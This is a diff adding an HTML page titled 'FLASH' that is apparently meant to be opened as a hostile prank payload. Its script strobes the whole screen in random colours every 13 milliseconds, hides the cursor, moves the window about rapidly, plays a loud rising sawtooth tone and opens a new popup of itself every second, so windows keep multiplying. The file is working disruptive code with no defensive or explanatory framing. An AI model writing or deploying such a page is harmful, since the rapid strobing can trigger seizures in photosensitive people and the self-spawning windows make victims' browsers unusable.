@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>FLASH</title>
+<style>
+  body { margin:0; padding:0; overflow:hidden; background:#000; cursor:none; }
+  #flash { position:fixed; inset:0; }
+  .close { position:absolute; top:8px; right:8px; background:#c00; color:white; padding:6px 14px; cursor:pointer; z-index:100; font-family:sans-serif; }
+</style>
+</head>
+<body>
+  <div id="flash"></div>
+  <div class="close" onclick="window.close()">✕ CLOSE</div>
+
+<script>
+  const flash = document.getElementById('flash');
+
+  // Fast flashing
+  setInterval(() => {
+    flash.style.background = `hsl(${Math.floor(Math.random()*360)}, 100%, 50%)`;
+  }, 13);
+
+  // Crazy fast movement
+  setInterval(() => {
+    const x = Math.random() * (screen.width - 380);
+    const y = Math.random() * (screen.height - 300);
+    window.moveTo(Math.floor(x), Math.floor(y));
+  }, 45);
+
+  // Loud rising sound
+  let audioCtx;
+  function playRise() {
+    try {
+      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.value = 110;
+      gain.gain.value = 0.8;
+      osc.connect(gain).connect(audioCtx.destination);
+      osc.start();
+      osc.frequency.linearRampToValueAtTime(1650, audioCtx.currentTime + 1);
+      setTimeout(() => {
+        gain.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.7);
+      }, 1050);
+    } catch(e) {}
+  }
+
+  setInterval(playRise, 2000);
+  playRise();
+
+  // Small windows also spawn more windows every 1 second
+  setInterval(() => {
+    try {
+      window.open('payload.html', '_blank', 'width=340,height=240');
+    } catch(e) {}
+  }, 1000);
+</script>
+</body>
+</html>
